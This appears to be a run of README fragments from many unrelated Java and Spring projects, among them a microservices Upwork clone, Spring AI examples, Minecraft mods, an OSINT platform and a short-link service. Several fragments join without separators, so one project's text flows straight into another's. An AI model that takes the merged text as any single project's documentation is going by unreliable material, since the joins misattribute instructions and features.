as well as relationships between tables and fields, from [DDL scripts exported from the database](https://docs.gudusoft.com/6.-sqlflow-ingester/introduction)
and generate an ER Diagram.
  
### Build and run the program
This is a spring boot web service that integrates browser-side applications with thymeleaf. So you no longer need to install additional web containers like Nginx.

#### Prerequisites
* Install maven
* Install Java jdk1.8
#### Build
Compile with the following Maven command, The compiled jar package is under the target folder.
```
mvn package
```
Of course, you can skip this step because there is already a compiled executable in the Bin Folder.
#### Run the program
```
java -jar bin/java_data_lineage-1.1.2.jar
```
When the startup is complete, open the program in the browser at the following URL:
http://localhost:9600

The default port is 9600, if you need to change the port, for example to 8000, you can start by the following command:
```
java -jar bin/java_data_lineage-1.1.2.jar --server.port=8000
``` 
![png](doc/images/home.png)
	  
### Export metadata from various databases.
You can export metadata from the database using [SQLFlow ingester](https://github.com/sqlparser/sqlflow_public/releases) 
and hand it over to Gudu SQLFlow for data lineage analysis.„ÄÇ

habuma/spring-ai-examples,main,"# Spring AI Examples

This repository is where I'll commit various examples of using Spring AI.

You can clone this project in its entirety and work with it like that. *Or*
better, use the [SpringCLI](https://docs.spring.io/spring-cli/reference/index.html)
to select individual projects and create them locally.

This repository includes a project-catalog.yml, so you can add it as a project
catalog to Spring CLI like this:

```
% spring project-catalog add spring-ai-examples https://github.com/habuma/spring-ai-examples
```

Then you will be able to see these projects when using `spring project list` and
be able to create projects locally using `spring boot new`. For example, to
create a new local copy of the ""prompts-and-output-parsers"" example, do this:

```
% spring boot new my-project output-parsers com.example.ai
```

This will create the project in a directory named ""my-project"" and will refactor
the package names to be `com.example.ai`.

You can also mix a project's functionality into an existing project by using
`spring boot add`. For example, let's say you already have a Spring Boot project
and want to add the functionality of the ""prompts-and-output-parsers"" project to
it. Here's how you would do that:

```
% spring boot add output-parsers
```

Be aware, however, that the Spring AI examples may build against newer versions
of Spring Boot than your project. If so, your project's original Boot version
will remain unchanged and you may get build or test errors. You'll need to
update your Boot version to the version of the example project to fix the build.

Also note that the project catalog includes one example that is maintained in
separate Git repositories:

- [SpeechAI](https://github.com/habuma/speechai)

Because they're in the project catalog, you can use the Spring CLI to create
those projects as well.

## Want more?

If you like this repository of example, then you're going to love [Spring AI in
Action](https://www.manning.com/books/spring-ai-in-action?a_aid=habuma&a_bid=f205d999&chan=habuma),
now available in Manning's Early Access Program (MEAP). It covers all aspects of
working with Spring AI with a fun example that runs throughout most of the book.

## Project Overview

WorkUp is a microservices-based application that allows freelancers and clients to connect, collaborate, and complete projects, similar to Upwork. üíº The system is designed with scalability and resilience in mind, utilizing various technologies to handle high traffic and large data volumes efficiently. üöÄ

### üèóÔ∏è Microservices

- All microservices are implemented using Java Spring Boot ‚òï.
-  They consume messages from the RabbitMQ message broker üê∞ and respond through RabbitMQ as well.
- Requests are cached in Redis, so if the same request is sent more than once, there is no need to recompute the response every time as it can be retrieved directly from the cache üóÉÔ∏è.
- All the microservices are stateless, as authentication and authorization are handled by the web server.
- In some cases, a microservice would have to communicate with another one to complete a certain functionality, which is done through RabbitMQ. Every microservice can be scaled up or down independently of other microservices to adapt to the amount of incoming traffic.
- Every microservice has its database that is shared by all the instances of the same microservice but cannot be accessed by other microservices.

<details>
   <summary>
      üë• Users Microservice
   </summary>
   This microservice handles user-related operations, like updating, fetching, deleting, and creating profiles, register & login üë§. In the case of register or login, a JWT is created and returned in the response, which will be used by the client to authorize future communications with the system üîë. The database used for this microservice is MongoDB üçÉ, as it achieves horizontal scalability, is highly available, and provides higher performance for reads and writes than relational databases. MongoDB 4.0 and later supports ACID transactions to some extent, which was enough for the users' microservice use case. 
</details>

<details>
   <summary>
      üí≥ Payments Microservice
   </summary>
   This microservice handles payment-related requests üí≥. Both freelancers and clients have wallets, which they can add or withdraw money from. Both of them have a history of transactions, and freelancers can issue payment requests that are then paid by the clients, and the money is deposited into the freelancer's wallet. When the payment is completed, the contracts service is notified that the contract associated with this payment should be marked as done. The DB used for this service is PostgreSQL üêò, as payments require lots of ACID transactions in addition to strict consistency, which is achieved by relational databases.
</details>


<details>
   <summary>
       üîß Jobs Microservice
   </summary>
   This microservice handles jobs and proposal requests üìù. Clients can create jobs, and view, and accept proposals for their jobs. Freelancers can browse jobs and search for them using keywords üîç. They can submit a proposal to any job, specifying the milestones that will achieve that job and any extra attachments. When a client accepts a proposal, the contracts service is notified about it to initiate a contract for that job üìú. The used DB for this microservice is Cassandra, as it can be scaled horizontally easily and is highly available and fault-tolerant, thanks to its peer-to-peer decentralized architecture. There is no need to have a relational DB for jobs, since there are not many joins performed, and there is no need for strong consistency and strict schema. However, high availability is critical, as most of the time users will be browsing jobs, which implies high traffic on the DB.
</details>

<details>
   <summary>
      üìú Contracts Microservice
   </summary>
   This microservice is responsible for contract-related logic üìë. It handles the termination and creation of contracts. Freelancers can update their progress in a milestone of their contracts, while clients can add evaluation to every milestone. Cassandra was used as a database for this microservice for the same reasons as the jobs microservice: scalability, high availability, and fault tolerance.
</details>



### üì¨ Message Queues

For this project, RabbitMQ was used for asynchronous communication between different components üê∞. A worker queue is assigned to every microservice, where all instances listen to it, while only one of them (the most available one) consumes the message and sends the response back if needed. In addition, a fanout exchange is created to allow the controller to send configuration messages that are consumed by all the running instances of a certain microservice.

### üåê Web Server

The web server is considered the API gateway for the backend of the system. It has a defined REST endpoint for every command in the four microservices. The web server takes the HTTP requests and converts them to message objects that can be sent and consumed by the designated microservice. After the execution is done, the web server receives the response as a message object, converts it to an HTTP response, and sends it back to the client. The web server handles authentication, as it checks the JWT sent with the request to determine whether the user is currently logged in üîë. After that, it extracts the user ID from the JWT and attaches it to the message that is sent to the worker queues.

#### API documentation
##### Introduction
Welcome to the Workup API documentation. This API provides endpoints for managing jobs, proposals, contracts, payments, and user authentication.

##### Authentication
All endpoints require authentication using a bearer token. Include the token in the Authorization header of your requests. 

```bash
Authorization: Bearer <your_access_token>
```

### üéõÔ∏è Controller


The controller provides a CLI that is used to broadcast configuration messages to all the running instances of a certain microservice üñ•Ô∏è. These messages configure the services in runtime without having to redeploy any instance, to achieve zero downtime updates ‚è≤Ô∏è. Here are the messages sent by the controller:

- `setMaxThreads`: Sets the maximum size of the thread pool used by a microservice.
- `setMaxDbConnections`: Sets the maximum number of database connections in the connections pool for a microservice. This is used only for the payments microservice since it is the only one using PostgreSQL, which allows connection pooling.
- `freeze`: Makes the microservice stop consuming any new messages, finishes the execution of any messages received by them, then releases all resources.
- `start`: Restarts a frozen microservice.
- `deleteCommand`: Deletes a command in a certain microservice in runtime. So the microservice no longer accepts requests of a certain type without having to redeploy all instances.
- `updateCommand`: Updates the logic performed by a certain command in runtime by byte code manipulation, which allows runtime updates while having zero downtime.
- `addCommand`: Adds a command that was deleted before from the microservice, to allow it to accept requests of that type again.
- `setLoggingLevel`: Sets the level of logs that should be logged (ERROR, INFO, etc.).
- `spawnMachine`: Replicates the whole backend on a new machine (the web server, the 4 microservices, the messaging queue, etc.).

### üì∫ Media Server
A media server that serves static resources.

#### ENV 

- `UPLOAD_USER`
- `UPLOAD_PASSWORD`
- `DISCOGS_API_KEY`


#### Static Endpoints

For all static resources, this server will attempt to return a relevant resource üìÅ, or else if the resource does not exist, it will return a default 'placeholder' resource üñºÔ∏è. This prevents clients from having no resource to display at all; clients can make use of this media server's 'describe' endpoint to learn about what resources are available üìã.

<details>
   <summary>
      Get resource
   </summary>
   

#### `GET` /static/icons/:icon.png

Returns an icon based on the filename.

`:icon` can be any icon filename.

Example: return an icon with filename 'accept.png'.

```bash
curl --request GET \
  --url http://path_to_server/static/icons/accept.png
```

#### `GET` /static/resume/:resume.pdf
 
Returns a resume based on the filename.

`:resume` can be any resume filename.

Example: return a resume with filename 'resume.pdf'.

```bash
curl --request GET \
  --url http://path_to_server/static/resume/resume.pdf
```

</details>

<details>
   <summary>
      Available groups
   </summary>
   
#### Describe

#### `GET` /describe

Returns a JSON representation of the media groups.

Example: return JSON containing of all groups present.

```bash
curl --request GET \
  --url http://localhost:8910/describe
```

```json
{
  ""success"": true,
  ""path"": ""/static/"",
  ""groups"": [""icons"", ""resume""]
}
```

#### `GET` /describe/:group

Returns a JSON representation of all the files current present for a given group.

`:group` can be any valid group.

Example: return JSON containing all the media resources for a the exec resource group.

```bash
curl --request GET \
  --url http://localhost:8910/describe/exec
```

```json
{
  ""success"": true,
  ""path"": ""/static/exec/"",
  ""mimeType"": ""image/jpeg"",
  ""files"": []
}
```
</details>

<details>
   <summary>
      Upload
   </summary>
   

Upload and convert media to any of the given static resource groups.

All upload routes are protected by basic HTTP auth. The credentials are defined by ENV variables `UPLOAD_USER` and `UPLOAD_PASSWORD`.

#### `POST` /upload/:group

POST a resource to a given group, assigning that resource a given filename.

`:group` can be any valid group.

```bash
curl --location 'http://path-to-server/upload/resume/' \
--header 'Authorization: Basic dXNlcjpwYXNz' \
--form 'resource=@""/C:/Users/ibrah/Downloads/Ibrahim_Abou_Elenein_Resume.pdf""' \
--form 'filename=""aboueleyes-reume-2""'
```

```json
{
  ""success"": true,
  ""path"": ""/static/resume/aboueleyes-resume-2.pdf""
}
```

A resource at `http://path_to_server/static/resume/aboueleyes-reume-2.pdf` will now be available.

## üöÄ Deployment

![Digital Ocean](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfQxeW7i7mdvQqs7IdiokF0IIaenP9OvqO7NZLVNca&s)

We were able to set up a tenant on [Digital ocean](https://try.digitalocean.com/cloud/?utm_campaign=emea_brand_kw_en_cpc&utm_adgroup=Misspellings&_keyword=digitalocean%27&_device=c&_adposition=&utm_content=conversion&utm_medium=cpc&utm_source=google&gad_source=1&gclid=CjwKCAjwr7ayBhAPEiwA6EIGxFUoqeEw6G9c-Vh1FvlsGCa6kaL7uDHwQMuVojoNVrMNXKcXnJ906BoCFVwQAvD_BwE) üåê Where we can create new instance (Droplet) üíß  from the Controller as explained above and feeding scripts in the startup of this instance to join docker swarm üê≥ of other machines. 


We can monitor the performance of each running container on each instance using [Portainer](https://www.portainer.io/)  üìä where we can manually run more containers of the same service, and configure it to auto-scale when the load is above the threshold. 


We tested the app in the hosted state and even performed load testing on it.‚úÖ

## üìà Auto-scaling

his script utilizes Prometheus paired with cAdvisor metrics to determine CPU usage üìä. It then utilizes a manager node to determine if a service wants to be autoscaled and uses another manager node to scale the service.

Currently, the project only utilizes CPU to autoscale. If CPU usage reaches 85%, the service will scale up; if it reaches 25%, it will scale down ‚¨ÜÔ∏è‚¨áÔ∏è.

2. if you want to autoscale you will need a deploy label `swarm.autoscaler=true`. 

```
deploy:
  labels:
    - ""swarm.autoscaler=true""
```

This is best paired with resource constraints limits. This is also under the deploy key.

```
deploy:
  resources:
    reservations:
      cpus: '0.25'
      memory: 512M
    limits:
      cpus: '0.50'
```

<details>
   <summary>
      Configuration
   </summary>
   
 
| Setting | Value | Description |
| --- | --- | --- |
| `swarm.autoscaler` | `true` | Required. This enables autoscaling for a service. Anything other than `true` will not enable it |
| `swarm.autoscaler.minimum` | Integer | Optional. This is the minimum number of replicas wanted for a service. The autoscaler will not downscale below this number |
| `swarm.autoscaler.maximum` | Integer | Optional. This is the maximum number of replicas wanted for a service. The autoscaler will not scale up past this number | 

</details>

## Load Balancing

We used a round-robin-based load balancing üîÑ that is handled by Docker in the Swarm üê≥. Simply, it sends the first request to the first instance of the app (not for a machine) and the next request to the next instance, and so on until all instances have received a request. Then, it starts again from the beginning. üöÄ

## üß™ Testing

### Functional Testing

To test our app functionality we created functional testing for each service on its own to test functionality in isolation as well as testing its functionality in integration with other services for example [here](services\payments\src\test\java\com\workup\payments\PaymentsApplicationTests.java) is the tests implemented for Payments service.üß™üîß

After Installing Piper you should be able to use TTS in-game once the voice pack is downloaded, and the engine has been started.

## Setting up Natural Speech
To set up Natural Speech, you will need to install a TTS engine, and download atleast one voice pack through the plugin's panel.

After intalling the plugin, open the panel by clicking the button on the side:

![](https://mechanic.ink/img/osrs/readme/naturalspeech-0.png)

You should see a plugin panel looking like the screenshot below.

![](https://mechanic.ink/img/osrs/readme/naturalspeech-1.png)

Make sure that under the `Play` and `Stop` control buttons the location of your piper installation is correct.
If it's not, piper will not work. To change it click on the browse button, and navigate to find `piper.exe` and press `Open`.

![](https://mechanic.ink/img/osrs/readme/naturalspeech-2.png)

Click `Download` on a voice pack.

## Architecture

<p align=""center"">
  <img src=""spring-boot-3.2-with-spring-cloud-function/src/main/resources/img/app_arch.png"" alt=""Application Architecture""/>
</p>

## Project Description
The code example include storing and retrieving product from the Amazon DynamoDB. I put Amazon API Gateway in front of my Lambdas.

I explore the following ways to run Spring Boot application with AWS Lambda Java or Customer Runtime with GraalVM Native Image:  

- Lambda with Java 21 Runtime and Spring Boot 3.2 and aws-serverless-java-container   
- Lambda with Java 21 Runtime and Spring Boot 3.2 and Spring Cloud Function   
- Lambda with Java 21 Runtime and Spring Boot 3.2 and Lambda Web Adapter   
- Lambda with Custom Runtime and Spring Boot 3.2 and GraalVM Native Image  


I made all the test for the following use cases:  

- Lambda function without SnapStart enabled  
- Lambda function with SnapStart enabled but without usage of Priming  
  -- doesn't currently work for AWS Custom Runtimes, so for GraalVM Native Image    
- Lambda function with SnapStart enabled but with usage of Priming (DynamoDB request invocation and if possible proxing the whole web request)  
  -- doesn't currently work for AWS Custom Runtimes, so for GraalVM Native Image      

# Installation and deployment

```bash

Clone git repository locally
git clone https://github.com/Vadym79/AWSLambdaJavaWithSpringBoot.git

Compile and package the Java application with Maven from the root (where pom.xml is located) of the project
mvn clean package

Deploy your application with AWS SAM
sam deploy -g  
```

In order not to use AWS Lambda SnapStart comment both lines in the globals's section of the Lambda function.

Globals:  
  Function:  
     #SnapStart:  
       #ApplyOn: PublishedVersions   

In order to user AWS Lambda SnapStart uncomment both lines above. For different Priming optimizations enabling of SnapStart is required.  
SnapStart doesn't currently work for AWS Custom Runtimes, so for GraalVM Native Image.

[![GitHub license](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](https://github.com/Hejow/easy-restdocs-generator/blob/main/LICENSE)

### This is a generator that suggest easier way to use rest-docs.

## Install

- `JDK 17` or higher is required
- `Spring Boot 3.X` is required

### Gradle

```groovy
testImplementation(""io.github.hejow:easy-restdocs-generator:1.0.0"")
```

### Maven

```xml

<dependency>
    <groupId>io.github.hejow</groupId>
    <artifactId>easy-restdocs-generator</artifactId>
    <version>1.0.4</version>
    <scope>test</scope>
</dependency>
```

## How to use

Only you have to do is **Customize tags** and **Use builder**.

### Customize tags

To specify your api, easy-restdoc use `ApiTag` to generate documents.

```java
// example
public enum MyTag implements ApiTag {
  USER(""user api"");

  private final String content;

  // ... constructor

  @Override
  public String getName() {
    return this.content;
  }
}
```

### Use builder

After test with `mockMvc` just use builder to generate as like below.

Planning to support `RestAssured`.

> ### üí° Tips
>
> To generate documents you MUST put `tag`, `result` on `Builder`.
>
> If you don‚Äôt put `identifier` on `Builder`, Method name of the test you wrote will be used as `identifier`
>
> Tests MUST run with rest-docs settings such as
`@ExtendWith(RestDocumentationExtension.class)` ([see here](https://github.com/Hejow/easy-restdocs-generator/blob/f25657a5aa20f813d9814d00b661bf6e11d300dd/sample/src/test/java/com/simplerestdocs/user/UserControllerTest.java#L45))

```java
// example
@Test
void myTest() throws Exception {
  // given

  // when
  var result = mockMvc.perform(...);

  // then
  result.andExpectAll(
    status().isOk(),
    ...
  );

  // docs
  result.andDo(
    Document.builder()
      .identifier(""identifier of your API"") // Can skip
      .tag(MyTag.USER) // Custom tags
      .summary(""this will be name of API"")
      .description(""write description about your API"")
      .result(result) // Test result
      .buildAndGenerate()
  );
}
```

## Overview

The **AntiHealthIndicator** plugin prevents hackers and modders from seeing other players' health. Designed to be
lightweight with minimal server performance impact, it modifies packets directly, making it impossible to bypass. Logic
executes asynchronously to minimize server load. Additional features include hiding durability, enchantments, item stack
amounts, player saturation, absorption, and XP.

### Requires PacketEvents

Ensure the [PacketEvents](https://modrinth.com/plugin/packetevents) library is installed on your server.

<img alt=""Cubes Without Borders Icon"" src=""media/icon.png"" width=""128"">

A mod that allows you to play Minecraft in a borderless fullscreen window. This means you can keep the game open while interacting with other applications on a different monitor, or even directly on top of Minecraft itself, without the game minimizing.

What sets **Cubes Without Borders** apart from other ""borderless fullscreen"" mods on the market is its explicit support for all major platforms: Linux, macOS, and even Windows. Instead of focusing on just one platform and leaving the mod broken for users of other operating systems, this project strives to provide the best possible experience for everyone, right out of the box. No screen flickering, no strange compositing glitches, no need to sacrifice the ability to change your game's resolution - just smooth, borderless fullscreen gameplay, as it was meant to be.

----

## Usage

To enable borderless fullscreen, go to the `Video Settings` tab where you'd typically find the `Fullscreen` setting, and switch it to the newly added third option: `Borderless`.

Depending on whether you have Sodium installed, you may find the option in question here:

| ![Video Settings](media/video-settings.png) | ![Video Settings (Sodium)](media/video-settings-sodium.png) |
| - | - |

Additionally, the mod introduces a `--borderless` startup flag for those interested. This flag works the same way as the existing `--fullscreen` one, but forces the game to start in borderless fullscreen mode instead.

----

## Config

The mod provides a simple configuration screen, which can be accessed if you have [`Cloth Config API`](https://modrinth.com/mod/cloth-config) installed:

<img alt=""Mod Settings"" width=""480"" src=""media/mod-settings.png"">

| Name | Description |
|:-----|-------------|
| Pause On Lost Focus | If set to `Yes`, Minecraft will automatically pause whenever its window loses focus |
| Fullscreen Type | Allows you to override the default fullscreen type used by Minecraft when the `Fullscreen` setting is set to `ON` |
| Borderless Fullscreen Type | Allows you to override the borderless fullscreen type used when the `Fullscreen` setting is set to `Borderless` |

### Fullscreen Types

| Name | Description |
|------|-------------|
| `minecraft:default` | Default fullscreen mode used by Minecraft |
| `minecraft:windowed` | OS-agnostic windowed fullscreen mode<br><br>This implementation is not tied to a specific OS, making it susceptible to quirks across different platforms. While it generally shouldn't be preferred over other fullscreen types, it might work well in certain contexts. |
| `linux:borderless` | Borderless fullscreen mode for Linux systems<br><br>It works well in most cases; however, due to [the FreeDesktop spec](https://specifications.freedesktop.org/wm-spec/wm-spec-1.3.html#STACKINGORDER), you may notice that conforming desktops *(like **KDE Plasma**)* don't place PiP windows *(e.g., media players)* above fullscreen windows. To fix this, change the layer of the window in question to `OSD` or `Overlay` *([here's an example for Firefox](media/kde-plasma-window-rules.png))*.<br>If you use **KDE Plasma** with an auto-hiding/dodging taskbar, you might want to try `minecraft:windowed`, as it functions pretty nicely in this scenario. |
| `macos:borderless` | Borderless fullscreen mode for macOS systems |
| `windows:borderless` | Borderless fullscreen mode for Windows systems<br><br>This implementation has a few quirks and doesn't always work well with overlays *(like the one from Discord)*. If possible, it is generally recommended to use `windows:windowed` instead. |
| `windows:windowed` | Windowed fullscreen mode for Windows systems<br><br>This provides the best experience for Windows users overall. The only known issue is that **OBS Game Capture** doesn't automatically detect Minecraft's window when using this mode. This is a bug with OBS, and I submitted a [pull request](https://github.com/obsproject/obs-studio/pull/10880) to address it. If it hasn't been merged yet, and this feature is important to you, consider using other fullscreen types as a temporary workaround. |
| `windows:exclusive` | Exclusive fullscreen mode for Windows systems that mimics some qualities of borderless fullscreen<br><br>You might be familiar with this if you're coming from mods like [`CW/B`](https://github.com/Kir-Antipov/cubes-with-borders) or [`Borderless Mining`](https://github.com/comp500/BorderlessMining)<br><br>However, it generally shouldn't be used, as it causes notorious screen flickering whenever the game window loses or regains focus, and it doesn't cooperate well with compositing.<br>Unless you're specifically aiming to minimize input lag in the game about blocks, which is the main and only benefit of this mode, it's best to consider other options. |

## Sub-directories

This is a collection of examples for [Jimmer](https://github.com/babyfish-ct/jimmer), containing the following 4 sub-directories:

|Sub-directory|Description|
|---|---|
|[java](./java/)|Examples in Java|
|[kotlin](./kotlin/)|Examples in Kotlin|
|[rest-client](./rest-client/)|[java/jimmer-sql/](./java/jimmer-sql/) and [kotlin/jimmer-sql-kt/](./kotlin/jimmer-sql-kt/) are two examples of building REST services using Jimmer. Jimmer can automatically generate TypeScript code required by the web client *([documentation link](https://babyfish-ct.github.io/jimmer-doc/docs/client/))*. This is a React-based web application that demonstrates how to use the automatically generated TypeScript code by Jimmer.|
|[env-with-cache](./env-with-cache/)|Jimmer supports powerful caching *([documentation link](https://babyfish-ct.github.io/jimmer-doc/docs/cache/))*. Developers can specify a Spring profile to run [java/jimmer-sql/](./java/jimmer-sql/), [kotlin/jimmer-sql-kt/](./kotlin/jimmer-sql-kt/), [java/jimmer-sql-graphql/](./java/jimmer-sql-graphql/), or [kotlin/jimmer-sql-graphql-kt/](./kotlin/jimmer-sql-graphql-kt/) with caching support. In this running mode, these examples require an external environment, and this sub-directory is the installation directory for those external environments.|

For more details, please refer to the descriptions in the respective sub-directories.

<!-- ABOUT THE PROJECT -->
## About The Project
There were 150 million new social media users between April 2022 and April 2023 - that's a 3.2% increase year-over-year from the current 
4.8 billion social media users worldwide, representing 59.9% of the global population and 92.7% of all internet users. Businesses use 
social media to gain insights about various topics: user sentiment around products, strong products and weak products, events, all things that cater to 
their customer. For intelligence analysts and social science researchers, who are their customers? Policymakers, the everyday citizen, everyone in society. 
This project's user, its customer, is the intelligence and social sciences analysts and researchers. As technology continues up the curve of
innovation, and society continues to increasingly use social media as the public square, researchers can use this available data for good, to 
draw insights, to slow down or stop harmful incidents, to help society, to develop plans based on public consensus, better inform policymakers of 
what their constituents need and want (and better plan solutions that increase the satisfaction of their customer). As it becomes harder for governments
to understand and execute solutions that better serve their constituents, the idea of adaptive governance, a focus on decentralized decision-making
structures, becomes unavoidable. Not only can insights gained from social media assist policymakers, it can assist adaptive governance entities and groups
to better serve their populations. This product is for the intelligence analyst, the social scientist, the data scientist and those interested in improving 
the quality of our human existence through deep public analysis and data-driven solutions.

## Features

## Watch Retrieval Augmented Generation (RAG) Demo
[![Watch the video](https://raw.githubusercontent.com/walimorris/opensquare/master/backend/src/main/resources/images/chat.png)](https://vimeo.com/949702850)


Along with other features, OpenSquare provides [Digit Footprint](https://en.wikipedia.org/wiki/Digital_footprint) targeting 
tools, some using well-known OSINT methods such as [Backlinks](https://en.wikipedia.org/wiki/Backlink), [NSLookup](https://en.wikipedia.org/wiki/Nslookup), 
and [Whois](https://en.wikipedia.org/wiki/WHOIS). Having a general suite of tools in a single place can increase user productivity. Easily navigate between
dashboard workspaces and use output from one tool as input for another.

### Experiment Generating Reports with GenAI
Experiment with generating reports and documents with GenAI. Use the information and images you've collected to generate 
reports that result in decision advantage. Ask our AI system to generate images for you based on the information context 
and summarize key details. Increase productivity and drastically reduce the speed to delivering key insights to decision
makers using click-and-point and draggable interfaces.

### Video Transcription with OpenAI's Whisper
Opensquare utilizes [Whisper](https://github.com/openai/whisper): a general-purpose speech recognition model.  It is trained on a large dataset of diverse audio and is also a
multitasking model that can perform multilingual speech recognition, speech translation, and language identification.

Using Opensquare's available API's, you can query and transcribe YouTube videos. Transcripts will report time and text properties. This API is used to build features on Opensquare , but will also be available to the public as an easy to use API. 

`opensquare/api/youtube/en/transcribe?videoId=l9AzO1FMgM8`

produces: 

`[
{
""time"": ""0.0"",
""text"": ""Java, a high-level multi-paradigm programming language famous for its ability to compile""
},
{
""time"": ""5.2"",
""text"": ""to platform independent bytecode.""
},
{
""time"": ""7.44"",
""text"": ""It was designed by James Gosling in 1990 at Sun Microsystems.""
},
{
""time"": ""11.700000000000001"",
""text"": ""One of its first demonstrations was the Star 7 PDA, which gave birth to the Java mascot""
},...

<!-- GETTING STARTED -->
## Getting Started

To get a local copy up and running follow these simple example steps.

### Prerequisites
* Linux
* Java 17
  ```sh
  java --version
  ```

* Maven 3.9 or above
  ```sh
  mvn --version
  ```

### Installation

1. Clone the repo
   ```sh
   git git clone https://opensentop@bitbucket.org/intelligence-opensent/opensentop.git
   ```
2. Install dependencies (including NPM) default profile 
   ```sh
   mvn clean install
   ```
   
3. Run webpack in development mode
   ```sh
   npm run watch
   
4. There are some configuration files you'll need - feel free to ping me for those.

<p align=""right"">(<a href=""#readme-top"">back to top</a>)</p>



<!-- USAGE EXAMPLES -->
## Usage

This project uses Eirik Sletteberg's [Frontend-Maven-Plugin](https://github.com/eirslett/frontend-maven-plugin) which allows our team to use a single plugin for both frontend and backend builds in a single repo.
This plugin is capable of various configurations, but the configuration used in this project is minimum only using Webpack and few configurations to install Node and NPM. The meat of this usage is from the 
creation of the project's bundle which is integrated using a `<script>` in root of React application (typical React fashion) exposed in the `index.html` file in the Springboot resources folder.
```
<body>
<div id='root'>
</div>
<script src=""built/bundle.js""></script>
</body>
```
Webpack will create a build bundle that contains the source for the React application entry in `app.js` under the `js` package of this project.
```
entry: path.resolve(__dirname, ""/src/main/js/app.js""),
    devtool: 'inline-source-map',
    cache: true,
    mode: 'development',
    output: {
        path: __dirname,
        filename: 'src/main/resources/static/built/bundle.js'
    },
```

### Kafka Usage - Local
If you're running kafka you should review the [Docs](https://kafka.apache.org/20/documentation.html). First ensure zoo-keeper server is running before running the kafka server. Sometimes zookeeper configs
`/config` folder is not setup properly. If you need to, ensure `clientPort=2181` is set in the `zookeeper.properties` and to ensure non-conflicting ports make sure `admin.serverPort=8083` is set in the same file.
We also want to ensure that `bootstrap.servers=9092` is configured in `producer.properties`: this is a list of brokers used for bootstrapping knowledge about the rest of the cluster format which is important for
this project's springboot configuration below:
```
@Bean
    public ConsumerFactory<String, OpenSentTaskStatus> consumerFactory() {
        Map<String, Object> configurationProperties = new HashMap<>();
        configurationProperties.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, ""localhost:9092"");
        configurationProperties.put(ConsumerConfig.GROUP_ID_CONFIG, ""group_id"");
        configurationProperties.put(JsonDeserializer.TRUSTED_PACKAGES, ""*"");
        configurationProperties.put(ConsumerConfig.KEY_DESERIALIZER_CLASS_CONFIG, StringDeserializer.class);
        configurationProperties.put(ConsumerConfig.VALUE_DESERIALIZER_CLASS_CONFIG, JsonDeserializer.class);
        configurationProperties.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, ""earliest"");
        return new DefaultKafkaConsumerFactory<>(configurationProperties);
    }
```
```
@Bean
    public ProducerFactory<String, OpenSentTaskStatus> producerFactory() {
        Map<String, Object> props = new HashMap<>();
        props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, ""localhost:9092"");
        props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class);
        props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, JsonSerializer.class);
        return new DefaultKafkaProducerFactory<>(props);
    }
```

yiyuan9/abitoflink,main,"# a bit of link

> **Note**: update config files to your dev env accordingly before running the application, start only aggregation and gateway services if you are running it within aggregation mode.

##  Intro
Short links are frequently used in everyday business marketing, such as in various marketing text messages, where short links appear. They help businesses identify user behavior, click rates, and other key information monitoring during marketing activities. 

The main functions of **abitoflink**  include, but are not limited to, the following aspects:
- **Enhancing user experience**: Short links are easier for users to remember and share, enhancing their experience.
- **Saving space**: Short links are shorter than long URLs, saving character space, especially in situations with character limits.
- **Beautification**: Short links are usually more aesthetically pleasing and concise.
- **Statistics and analysis**: It is possible to track the visits to short links to understand user behavior and preferences.

## Technical Architecture

In the system design, the latest **JDK17 + SpringBoot3 + SpringCloud** microservices architecture is adopted to build a **high-concurrency, large-data-volume** short link generation service that remains efficient and reliable.

This is a one-to-one replica of the [ender relay concept](https://www.youtube.com/watch?v=L1i4izl25V4) a youtuber by the name of Kenadian made.

The resources for the block were provided by Kenadian.

The Ender Relay is a block that can only be used in the end, it is crafted with a lodestone compass and can be charged like a respawn anchor, instead with a end crystal. When a player clicks the block, it teleports to the lodestone compasses location, ontop of the lodestone.

This completes the trilogy of the bed, respawn anchor by introducing a transportation item for the end dimension.

For more on the concept (and the mod, since its a 1:1), watch the video linked above!

‚ö†Ô∏è For now please stop using this mod. Another method of detecting mods has been found, and I am not able to resolve it at this time. Using this mod might cause you to get banned. ‚ö†Ô∏è

<p align=""center"">
<img src=""src/main/resources/assets/moddetectionpreventer/icon.png"">
</p>

<p style=""text-align: center"">A simple mod that prevents a security vulnerability allowing servers to detect which mods are installed on
the client side.</p>


**While I try my best to keep this mod up to date, server admins might find a new method to access your mods-list. It is always recommended that you follow the server rules.**

## The Vulnerability

Minecraft has a feature that allows text (in chat, on signs, or in the bossbar) to be specified by a keybind the user
has set, or a translation key. The Client will then replace the translation key, or the keybind with the stored value.
This can be abused by the server by serving the client a sign with such a placeholder (for example Sodium:
`sodium.option_impact.low`). By immediately closing the sign screen, the client sends the edited text to the server
without ever seeing a sign open screen. The server can then detect wether you have that specific mod installed, by
checking if your client replaced the placeholder with the corresponding text (`sodium.option_impact.low -> Low`). If
you don't have Sodium installed, the placeholder will stay there
(`sodium.option_impact.low -> sodium.option_impact.low`).

This also works on the Anvil screen. The server could prompt you to open the anvil screen, with an item in the
renaming slot that has a translation key as it's name. The client would then rename the item to the corresponding
value and send an update to the server. (Huge thanks to Frog, `@croaak` on discord, for figuring this out)

This detection method works for any mod that has custom translations.

## The Fix

This mod fixes this issue by simply not resolving any translation or keybind placeholders on signs, except vanilla
ones. This makes it impossible for the server to use this method to detect installed mods.

To verify this works you can test it in a [test world](https://github.com/JustAlittleWolf/ModDetectionPreventer/raw/1.20.4/testWorld.zip).

## Intentions

~~While this feature can be used to prevent harm by detecting cheaters early, it is implemented improperly on some
servers, including [Cytooxien](CytooxienDetectedMods.md). Immediately banning players upon joining, simply because they
have tweakeroo installed, is unacceptable.~~
After a discussion with the developer of Cytooxien, they told me that players won't get banned for using tweakeroo, only kicked repeatedly.

<p>I made this project to learn about online games netcode.</>

<p>It is heavily inspired of L2J project as I am mostly following the same structure.</p>

<p>The objective is to make it generic and not only focused on the old mmorpg Lineage2</p>

I use it to handle multiplayer in my other project [l2-unity](https://gitlab.com/shnok/l2-unity).

## Current features

For now it contains only basic features of an online RPG game. <p>Such as:
- Chat features
- Player sync
	- Position
	- Rotation
	- Animation
- Basic NPC AI
	- Patrol around point
